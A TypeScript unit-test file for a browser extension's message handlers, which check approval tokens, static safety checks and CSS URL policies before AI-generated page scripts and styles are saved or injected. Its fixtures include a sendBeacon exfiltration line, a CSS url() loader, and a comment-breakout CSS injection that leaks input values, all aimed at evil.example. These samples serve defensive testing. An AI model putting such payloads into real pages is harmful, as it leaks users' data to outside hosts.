import { beforeEach, describe, expect, it, vi } from 'vitest'
import { DEFAULT_SETTINGS } from '@shared/types'
import type { Message } from '@shared/messages'
import type { ReviewResult, Settings, Transform } from '@shared/types'
import { isApproved, recordApproval } from './approvals'
import { ProviderError } from './providers/types'

const BIND = { transformId: 't', match: 'shop.example.com/*' }
const BIND_FIELDS = BIND
import {
  applyCssTransforms,
  fromExtensionPage,
  handleApproveCode,
  handleBlockedCount,
  handlePreviewCss,
  handleReview,
  cssPolicyChanged,
  handleSaveTransform,
  type CssApplyDeps,
  type SaveDeps,
} from './handlers'

/*
 * What is replaced here is the browser: session storage for the approval
 * records, and the storage, tab and injection functions the handlers receive.
 * The checks are the real ones, so a test fails if a handler stops calling one.
 */
let session: Record<string, unknown> = {}

beforeEach(() => {
  session = {}
  vi.stubGlobal('browser', {
    storage: {
      session: {
        get: async (key: string) => (key in session ? { [key]: session[key] } : {}),
        set: async (items: Record<string, unknown>) => {
          Object.assign(session, items)
        },
      },
    },
  })
})

const GOOD_JS = "document.querySelector('aside').style.display = 'none'"
const BAD_JS = "const n = navigator; n.sendBeacon('https://evil.example/', document.title)"
const GOOD_CSS = 'aside { display: none }'
const BAD_CSS = 'a { background: url(https://evil.example/t) }'

const transform = (over: Partial<Transform>): Transform => ({
  id: 't',
  name: 'T',
  enabled: true,
  order: 0,
  match: 'shop.example.com/*',
  kind: 'js',
  origin: 'ai',
  capabilities: [],
  intent: 'x',
  rationale: { targets: '', approach: '', assumptions: [] },
  anchor: { tag: 'div', classes: [], path: '', landmarks: [], selector: 'div' },
  code: GOOD_JS,
  createdAt: 0,
  updatedAt: 0,
  ...over,
})

/** Stub dependencies that record what the save handler did. */
function saveDeps(stored: Transform[] = [], settings: Settings = DEFAULT_SETTINGS) {
  const calls: string[] = []
  const deps: SaveDeps = {
    getAllTransforms: async () => stored,
    getSettings: async () => settings,
    tabUrl: async () => 'https://shop.example.com/cart',
    // Same field check as the real one, so a record with a missing field is refused.
    assertValidTransform: (value) => {
      if (!value || typeof (value as Transform).id !== 'string') {
        throw new Error('This transform has no valid "id" field, so it was not saved.')
      }
    },
    saveTransform: async (t) => {
      calls.push(`save:${t.id}`)
      return t
    },
    registerTransform: async (t) => {
      calls.push(`register:${t.id}`)
    },
    transformEdited: async (id) => {
      calls.push(`badge:${id}`)
    },
    reapply: async () => {
      calls.push('reapply')
    },
  }
  return { deps, calls }
}

const saveMessage = (t: Transform, approvalToken?: string): Extract<Message, { type: 'save-transform' }> => ({
  type: 'save-transform',
  transform: t,
  tabId: 1,
  ...(approvalToken ? { approvalToken } : {}),
})

describe('handleSaveTransform: JavaScript', () => {
  it('refuses code that static analysis rejects, even when it was approved', async () => {
    const token = await recordApproval(BAD_JS, undefined, [], 'match', BIND)
    const { deps, calls } = saveDeps()
    await expect(handleSaveTransform(saveMessage(transform({ code: BAD_JS }), token), deps)).rejects.toThrow(/did not pass the safety check/)
    expect(calls).toEqual([])
  })

  it('refuses a record with a missing field before reading its code', async () => {
    const { deps, calls } = saveDeps()
    const broken = { ...transform({}), id: undefined } as unknown as Transform
    await expect(handleSaveTransform(saveMessage(broken), deps)).rejects.toThrow(/valid "id" field/)
    expect(calls).toEqual([])
  })

  it('registers and badges the record as stored, not the copy that was sent', async () => {
    const token = await recordApproval(GOOD_JS, undefined, [], 'match', BIND)
    const { deps, calls } = saveDeps()
    deps.saveTransform = async (t) => {
      calls.push(`save:${t.id}`)
      return { ...t, enabled: false }
    }
    deps.registerTransform = async (t) => {
      calls.push(`register:${t.enabled}`)
    }
    await handleSaveTransform(saveMessage(transform({ enabled: true }), token), deps)
    expect(calls).toContain('register:false')
  })

  it('refuses code that was never approved, and nothing is stored or registered', async () => {
    const { deps, calls } = saveDeps()
    await expect(handleSaveTransform(saveMessage(transform({})), deps)).rejects.toThrow(/not approved/)
    expect(calls).toEqual([])
  })

  it('control: the same code is saved, registered and applied once it is approved', async () => {
    const token = await recordApproval(GOOD_JS, undefined, [], 'match', BIND)
    const { deps, calls } = saveDeps()
    await handleSaveTransform(saveMessage(transform({}), token), deps)
    expect(calls).toEqual(['save:t', 'register:t', 'badge:t', 'reapply'])
  })

  it('refuses a token that was issued for another transform or another match pattern', async () => {
    const token = await recordApproval(GOOD_JS, undefined, [], 'match', { transformId: 'other', match: BIND.match })
    const { deps, calls } = saveDeps()
    await expect(handleSaveTransform(saveMessage(transform({}), token), deps)).rejects.toThrow(/not approved/)
    const wrongSite = await recordApproval(GOOD_JS, undefined, [], 'match', { ...BIND, match: 'evil.example/*' })
    await expect(handleSaveTransform(saveMessage(transform({}), wrongSite), deps)).rejects.toThrow(/not approved/)
    expect(calls).toEqual([])
  })

  it('uses a token up when the save succeeds, so the same approval cannot save twice', async () => {
    const token = await recordApproval(GOOD_JS, undefined, [], 'match', BIND)
    const { deps, calls } = saveDeps()
    await handleSaveTransform(saveMessage(transform({}), token), deps)
    await expect(handleSaveTransform(saveMessage(transform({}), token), deps)).rejects.toThrow(/not approved/)
    expect(calls.filter((c) => c === 'save:t')).toHaveLength(1)
  })

  it('keeps the token when the save fails, so the user can retry', async () => {
    const token = await recordApproval(GOOD_JS, undefined, [], 'match', BIND)
    const { deps, calls } = saveDeps()
    deps.saveTransform = async () => {
      throw new Error('storage failed')
    }
    await expect(handleSaveTransform(saveMessage(transform({}), token), deps)).rejects.toThrow(/storage failed/)
    const retry = saveDeps()
    await handleSaveTransform(saveMessage(transform({}), token), retry.deps)
    expect(retry.calls).toContain('save:t')
    expect(calls).toEqual([])
  })

  it('refuses a one-character change to approved code', async () => {
    const token = await recordApproval(GOOD_JS, undefined, [], 'match', BIND)
    const { deps, calls } = saveDeps()
    await expect(handleSaveTransform(saveMessage(transform({ code: GOOD_JS + ' ' }), token), deps)).rejects.toThrow(/not approved/)
    expect(calls).toEqual([])
  })

  it('lets a rename of stored code through without a new approval', async () => {
    const stored = transform({ name: 'Old' })
    const { deps, calls } = saveDeps([stored])
    await handleSaveTransform(saveMessage(transform({ name: 'New' })), deps)
    expect(calls).toContain('save:t')
  })
})

describe('handleSaveTransform: CSS', () => {
  it('refuses CSS that loads an address, and nothing is stored', async () => {
    const { deps, calls } = saveDeps()
    await expect(
      handleSaveTransform(saveMessage(transform({ kind: 'css', code: BAD_CSS })), deps),
    ).rejects.toThrow(/load/)
    expect(calls).toEqual([])
  })

  it('control: ordinary CSS is saved and applied, and not registered as a script', async () => {
    const { deps, calls } = saveDeps()
    await handleSaveTransform(saveMessage(transform({ kind: 'css', code: GOOD_CSS })), deps)
    expect(calls).toEqual(['save:t', 'badge:t', 'reapply'])
  })

  it('uses the page the save came from: the same CSS passes where the site allows it', async () => {
    const css = 'a { background: url(/local.png) }'
    const { deps: strict } = saveDeps()
    await expect(handleSaveTransform(saveMessage(transform({ kind: 'css', code: css })), strict)).rejects.toThrow()
    const relaxed = { ...DEFAULT_SETTINGS, cssUrlPolicy: { '*.example.com': 'same-origin' as const } }
    const { deps, calls } = saveDeps([], relaxed)
    await handleSaveTransform(saveMessage(transform({ kind: 'css', code: css })), deps)
    expect(calls).toContain('save:t')
  })

  it('saves same-origin CSS under a scheme-prefixed pattern with no tab, as the editor does (#50)', async () => {
    // The editor sends no tab id. The page is then taken from the pattern, and
    // a pattern with a scheme used to give the address https://https:/.
    const css = 'a { background: url(/bg.png) }'
    const settings = { ...DEFAULT_SETTINGS, cssUrlPolicy: { 'shop.example.com': 'same-origin' as const } }
    const { deps, calls } = saveDeps([], settings)
    deps.tabUrl = async () => undefined
    const message = { ...saveMessage(transform({ kind: 'css', code: css, match: 'https://shop.example.com/*' })) }
    delete (message as { tabId?: number }).tabId
    await handleSaveTransform(message, deps)
    expect(calls).toContain('save:t')
    // Control: the same CSS under a site with no setting is refused.
    const strict = saveDeps()
    strict.deps.tabUrl = async () => undefined
    await expect(handleSaveTransform(message, strict.deps)).rejects.toThrow()
  })

  it('lets unchanged CSS through so a rename is not refused by a rule that was already there', async () => {
    const stored = transform({ kind: 'css', code: BAD_CSS })
    const { deps, calls } = saveDeps([stored])
    await handleSaveTransform(saveMessage(transform({ kind: 'css', code: BAD_CSS, name: 'New' })), deps)
    expect(calls).toContain('save:t')
  })
})

describe('handleSaveTransform: CSS and the match pattern (#50)', () => {
  it('checks unchanged CSS again when its match pattern changed', async () => {
    const stored = transform({ kind: 'css', code: BAD_CSS })
    const { deps, calls } = saveDeps([stored])
    await expect(
      handleSaveTransform(saveMessage(transform({ kind: 'css', code: BAD_CSS, match: 'other.example/*' })), deps),
    ).rejects.toThrow(/load/)
    expect(calls).toEqual([])
  })

  it('lets unchanged CSS through when the match pattern is the same (control)', async () => {
    const stored = transform({ kind: 'css', code: BAD_CSS })
    const { deps, calls } = saveDeps([stored])
    await handleSaveTransform(saveMessage(transform({ kind: 'css', code: BAD_CSS })), deps)
    expect(calls).toContain('save:t')
  })
})

describe('handlePreviewCss', () => {
  const previewDeps = (settings: Settings = DEFAULT_SETTINGS) => {
    const injected: (string | null)[] = []
    return {
      injected,
      deps: {
        getSettings: async () => settings,
        tabUrl: async () => 'https://shop.example.com/cart',
        setPreviewCss: async (_tab: number, css: string | null) => {
          injected.push(css)
        },
      },
    }
  }

  it('does not inject CSS that fails the check', async () => {
    const { deps, injected } = previewDeps()
    await expect(handlePreviewCss({ type: 'preview-css', tabId: 1, css: BAD_CSS }, deps)).rejects.toThrow(/load/)
    expect(injected).toEqual([])
  })

  it('does not inject CSS that is waiting for approval of an external address', async () => {
    const settings = { ...DEFAULT_SETTINGS, cssUrlPolicy: { '*.example.com': 'list-external' as const } }
    const { deps, injected } = previewDeps(settings)
    await expect(handlePreviewCss({ type: 'preview-css', tabId: 1, css: BAD_CSS }, deps)).rejects.toThrow(/not approved/)
    expect(injected).toEqual([])
  })

  it('control: ordinary CSS is injected', async () => {
    const { deps, injected } = previewDeps()
    await handlePreviewCss({ type: 'preview-css', tabId: 1, css: GOOD_CSS }, deps)
    expect(injected).toEqual([GOOD_CSS])
  })
})

describe('handleReview and handleApproveCode', () => {
  const passed: ReviewResult = {
    static: [],
    undeclaredCapabilities: [],
    model: { verdict: 'match', explanation: 'ok' },
    passed: true,
  }
  const review = (code: string): Extract<Message, { type: 'review' }> => ({
    type: 'review',
    code,
    intent: 'hide it',
    instructions: [{ text: 'hide it', source: 'typed' }],
    declaredCapabilities: [],
    transformId: BIND.transformId,
    match: BIND.match,
  })

  it('records the approval for a review sent by an extension page and returns its token', async () => {
    const result = await handleReview(review(GOOD_JS), true, { runReview: async () => passed })
    expect(result.approvalToken).toBeTruthy()
    expect(await isApproved(result.approvalToken, GOOD_JS, undefined, [], BIND)).toBe(true)
  })

  it('records nothing for a review sent by a content script, and still returns the result', async () => {
    const result = await handleReview(review(GOOD_JS), false, { runReview: async () => passed })
    expect(result).toBe(passed)
    expect(result.approvalToken).toBeUndefined()
    expect(Object.keys(session)).toEqual([])
  })

  it('records nothing when static analysis stopped the review before the model ran', async () => {
    const stopped: ReviewResult = { static: [], undeclaredCapabilities: [], passed: false }
    const result = await handleReview(review(GOOD_JS), true, { runReview: async () => stopped })
    expect(result.approvalToken).toBeUndefined()
    expect(Object.keys(session)).toEqual([])
  })

  it('records no approval when the provider refuses the review (#153)', async () => {
    const refusal = new ProviderError('declined', 'refusal', false)
    await expect(
      handleReview(review(GOOD_JS), true, {
        runReview: async () => {
          throw refusal
        },
      }),
    ).rejects.toBe(refusal)
    expect(Object.keys(session)).toEqual([])
  })

  it('records a disagreeing verdict too, because the user may still choose to save', async () => {
    const mismatch: ReviewResult = { ...passed, model: { verdict: 'mismatch', explanation: 'no' }, passed: false }
    const result = await handleReview(review(GOOD_JS), true, { runReview: async () => mismatch })
    expect(await isApproved(result.approvalToken, GOOD_JS, undefined, [], BIND)).toBe(true)
  })

  it('refuses approve-code from a content script and records nothing', async () => {
    const message: Extract<Message, { type: 'approve-code' }> = { type: 'approve-code', code: GOOD_JS, declaredCapabilities: [], ...BIND_FIELDS }
    await expect(handleApproveCode(message, false)).rejects.toThrow(/Only the extension/)
    expect(Object.keys(session)).toEqual([])
  })

  it('refuses approve-code for code that fails static analysis', async () => {
    const message: Extract<Message, { type: 'approve-code' }> = { type: 'approve-code', code: BAD_JS, declaredCapabilities: [], ...BIND_FIELDS }
    await expect(handleApproveCode(message, true)).rejects.toThrow(/did not pass the safety check/)
    expect(Object.keys(session)).toEqual([])
  })

  it('control: approve-code from an extension page records the approval and returns its token', async () => {
    const { approvalToken } = await handleApproveCode(
      { type: 'approve-code', code: GOOD_JS, declaredCapabilities: [], ...BIND_FIELDS },
      true,
    )
    expect(await isApproved(approvalToken, GOOD_JS, undefined, [], BIND)).toBe(true)
  })
})

describe('fromExtensionPage', () => {
  const base = 'moz-extension://abc-123/'
  it('accepts a page of the extension', () => {
    expect(fromExtensionPage({ url: `${base}src/sidebar/index.html` }, base)).toBe(true)
  })
  it('refuses a web page, a lookalike address and a sender with no address', () => {
    expect(fromExtensionPage({ url: 'https://evil.example/' }, base)).toBe(false)
    expect(fromExtensionPage({ url: 'moz-extension://abc-1234/x' }, base)).toBe(false)
    expect(fromExtensionPage({}, base)).toBe(false)
  })
})

describe('applyCssTransforms', () => {
  function cssDeps(settings: Settings = DEFAULT_SETTINGS, tabStore?: string) {
    const log: string[] = []
    const applied = new Map<number, string>()
    const deps: CssApplyDeps = {
      getSettings: async () => settings,
      insertCss: async (tab, css) => {
        log.push(`insert:${tab}:${css}`)
      },
      removeCss: async (tab, css) => {
        log.push(`remove:${tab}:${css}`)
      },
      tabCookieStore: async () => tabStore,
      applied: {
        read: async (tab) => applied.get(tab),
        write: async (tab, css) => {
          applied.set(tab, css)
        },
        forget: async (tab) => {
          applied.delete(tab)
        },
      },
    }
    return { deps, log, applied }
  }
  const URL_ON_PAGE = 'https://shop.example.com/cart'

  it('leaves out stored CSS that no longer passes and still applies the rest', async () => {
    const { deps, log } = cssDeps()
    await applyCssTransforms(
      deps,
      1,
      [
        transform({ id: 'a', kind: 'css', code: GOOD_CSS, name: 'good', order: 0 }),
        transform({ id: 'b', kind: 'css', code: BAD_CSS, name: 'bad', order: 1 }),
      ],
      URL_ON_PAGE,
    )
    expect(log).toEqual([`insert:1:/* transform 1 */\n${GOOD_CSS}`])
  })

  it('inserts nothing when the tab no longer shows the page, and inserts when it does', async () => {
    const { deps, log } = cssDeps()
    const css = [transform({ id: 'a', kind: 'css', code: GOOD_CSS, name: 'good' })]
    await applyCssTransforms(deps, 1, css, URL_ON_PAGE, async () => false)
    expect(log).toEqual([])
    await applyCssTransforms(deps, 1, css, URL_ON_PAGE, async () => true)
    expect(log).toEqual([`insert:1:/* transform 1 */\n${GOOD_CSS}`])
  })

  it('does not put a transform name into the inserted CSS (#145)', async () => {
    const hostile = 'x */ input[value^="a"]{background:url(https://evil.example/a)} /*'
    const { deps, log } = cssDeps()
    await applyCssTransforms(
      deps,
      1,
      [transform({ id: 'a', kind: 'css', code: 'aside{display:none}', name: hostile })],
      URL_ON_PAGE,
    )
    expect(log).toEqual(['insert:1:/* transform 1 */\naside{display:none}'])
    expect(log.join('')).not.toContain('evil.example')
  })

  it('injects nothing when every stored rule fails', async () => {
    const { deps, log } = cssDeps()
    await applyCssTransforms(deps, 1, [transform({ kind: 'css', code: BAD_CSS })], URL_ON_PAGE)
    expect(log).toEqual([])
  })

  it('control: the same stored CSS is injected where the site setting allows it', async () => {
    const css = 'a { background: url(/local.png) }'
    const { deps: strict, log: strictLog } = cssDeps()
    await applyCssTransforms(strict, 1, [transform({ kind: 'css', code: css })], URL_ON_PAGE)
    expect(strictLog).toEqual([])

    const { deps, log } = cssDeps({ ...DEFAULT_SETTINGS, cssUrlPolicy: { '*.example.com': 'same-origin' } })
    await applyCssTransforms(deps, 1, [transform({ kind: 'css', code: css })], URL_ON_PAGE)
    expect(log).toHaveLength(1)
  })

  it('takes back CSS that was injected before the rules changed', async () => {
    const css = 'a { background: url(/local.png) }'
    const relaxed = { ...DEFAULT_SETTINGS, cssUrlPolicy: { '*.example.com': 'same-origin' as const } }
    const { deps, log, applied } = cssDeps(relaxed)
    const t = [transform({ kind: 'css', code: css, name: 'n' })]
    await applyCssTransforms(deps, 1, t, URL_ON_PAGE)
    expect(applied.get(1)).toContain(css)

    // The setting is tightened and the tab is reapplied.
    const strict = { ...deps, getSettings: async () => DEFAULT_SETTINGS }
    await applyCssTransforms(strict, 1, t, URL_ON_PAGE)
    expect(log.at(-1)).toMatch(/^remove:1:/)
    expect(applied.has(1)).toBe(false)
  })

  it('leaves out CSS restricted to another container and keeps the rest (#127)', async () => {
    const { deps, log } = cssDeps(DEFAULT_SETTINGS, 'firefox-container-1')
    await applyCssTransforms(
      deps,
      1,
      [
        transform({ id: 'a', kind: 'css', code: GOOD_CSS, name: 'here', order: 0, cookieStoreId: 'firefox-container-1' }),
        transform({ id: 'b', kind: 'css', code: GOOD_CSS, name: 'there', order: 1, cookieStoreId: 'firefox-container-2' }),
        transform({ id: 'c', kind: 'css', code: GOOD_CSS, name: 'any', order: 2 }),
      ],
      URL_ON_PAGE,
    )
    expect(log).toEqual([`insert:1:/* transform 1 */\n${GOOD_CSS}\n\n/* transform 2 */\n${GOOD_CSS}`])
  })

  it('leaves out restricted CSS when the tab container cannot be read (#127)', async () => {
    const { deps, log } = cssDeps(DEFAULT_SETTINGS, undefined)
    await applyCssTransforms(
      deps,
      1,
      [transform({ id: 'a', kind: 'css', code: GOOD_CSS, cookieStoreId: 'firefox-container-1' })],
      URL_ON_PAGE,
    )
    expect(log).toEqual([])
  })

  // Control: the same transform with no restriction applies where the
  // container is unknown, so the two tests above fail for the restriction.
  it('control: unrestricted CSS applies where the container is unknown', async () => {
    const { deps, log } = cssDeps(DEFAULT_SETTINGS, undefined)
    await applyCssTransforms(deps, 1, [transform({ id: 'a', kind: 'css', code: GOOD_CSS })], URL_ON_PAGE)
    expect(log).toHaveLength(1)
  })

  it('does not inject the same CSS twice', async () => {
    const { deps, log } = cssDeps()
    const t = [transform({ kind: 'css', code: GOOD_CSS })]
    await applyCssTransforms(deps, 1, t, URL_ON_PAGE)
    await applyCssTransforms(deps, 1, t, URL_ON_PAGE)
    expect(log).toHaveLength(1)
  })
})

describe('cssPolicyChanged', () => {
  it('is true when a site setting is added, changed or removed', () => {
    expect(cssPolicyChanged({}, { 'a.example': 'same-origin' })).toBe(true)
    expect(cssPolicyChanged({ 'a.example': 'same-origin' }, { 'a.example': 'list-external' })).toBe(true)
    expect(cssPolicyChanged({ 'a.example': 'same-origin' }, {})).toBe(true)
  })

  it('control: the same site settings in another key order are not a change', () => {
    expect(
      cssPolicyChanged({ a: 'same-origin', b: 'list-external' }, { b: 'list-external', a: 'same-origin' }),
    ).toBe(false)
  })
})

describe('handleBlockedCount', () => {
  const count = (stored: Transform[], settings: Settings = DEFAULT_SETTINGS) =>
    handleBlockedCount({ getAllTransforms: async () => stored, getSettings: async () => settings })

  it('counts enabled transforms on any site that fail the check now', async () => {
    const stored = [
      transform({ id: 'a', kind: 'css', code: BAD_CSS, match: 'one.example/*' }),
      transform({ id: 'b', kind: 'css', code: BAD_CSS, match: 'two.example/*' }),
      transform({ id: 'c', kind: 'js', code: BAD_JS, match: 'three.example/*' }),
    ]
    expect(await count(stored)).toBe(3)
  })

  it('control: passing transforms and disabled ones are not counted', async () => {
    const stored = [
      transform({ id: 'a', kind: 'css', code: GOOD_CSS }),
      transform({ id: 'b', kind: 'js', code: GOOD_JS }),
      transform({ id: 'c', kind: 'css', code: BAD_CSS, enabled: false }),
    ]
    expect(await count(stored)).toBe(0)
  })

  it('follows the site setting: CSS that the setting allows is not counted', async () => {
    const stored = [transform({ id: 'a', kind: 'css', code: 'a { background: url(/x.png) }', match: 'shop.example.com/*' })]
    expect(await count(stored)).toBe(1)
    expect(await count(stored, { ...DEFAULT_SETTINGS, cssUrlPolicy: { 'shop.example.com': 'same-origin' } })).toBe(0)
  })
})
